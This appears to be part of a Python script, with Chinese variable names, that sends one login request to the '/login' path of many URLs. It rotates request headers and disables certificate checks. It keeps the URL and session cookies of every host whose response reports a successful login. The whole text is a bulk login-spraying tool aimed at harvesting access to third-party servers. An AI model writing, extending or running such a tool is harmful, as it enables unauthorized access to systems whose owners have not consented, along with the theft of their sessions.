#定义一个处理URL文件
def 处理URL(原始URL):
    处理后URL = []
    for 取出URL in 原始URL:
        拼接URL = 取出URL + "/login"
        处理后URL.append(拼接URL)
    return 处理后URL

#定义一个登录函数
def 登录(URL,请求头,请求体,超时):
    未超时响应包={}
    for url in URL:
        try:
            随机请求头 = random.choice(请求头)
            响应包 = requests.post(url,headers=随机请求头,data=请求体,timeout=超时,verify=False)
            未超时响应包[url] = 响应包
        except:
            print(url,"请求超时")
    return 未超时响应包
        
    

#定义一个函数把登录成功的url保存下来
def 保存(响应包):
    for URL in 响应包:
        正则 = re.compile(r'"success":(?P<success>.*?),"msg":"(?P<MSG>.*?)","obj"',re.S)
        响应体 = 正则.finditer(响应包[URL].text)
        for 关键字 in 响应体:
            if 关键字.group("success") == "true" or 关键字.group("MSG") == "登陆成功" :
                success = 关键字.group("success")
                MSG = 关键字.group("MSG")
                cookie = 响应包[URL].cookies
                成功文件.write(f"{success},{MSG},{URL},{cookie}\n")


def main():
    处理后URL = 处理URL(去除空格)
    未超时响应包 = 登录(处理后URL,请求头清单,请求体,15)
    保存(未超时响应包)
    URL文件.close()
    成功文件.close()

    


if __name__ == "__main__":
    main()
